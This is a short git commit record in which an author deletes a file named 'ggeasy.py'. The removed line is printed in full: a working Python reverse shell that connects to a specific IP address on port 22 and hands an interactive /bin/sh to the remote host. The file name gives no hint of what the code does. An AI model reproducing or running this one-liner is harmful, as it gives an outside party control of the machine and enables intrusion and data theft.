e93157af5ca44a0803c1894ac6b298244cbb51be
ZemarKhos <zshadow@protonmail.ch>
2020-05-11 21:52:22 -0400

    Delete ggeasy.py

--- ggeasy.py
+++
@@ -1,1 +0,0 @@
--c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("193.192.127.252",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
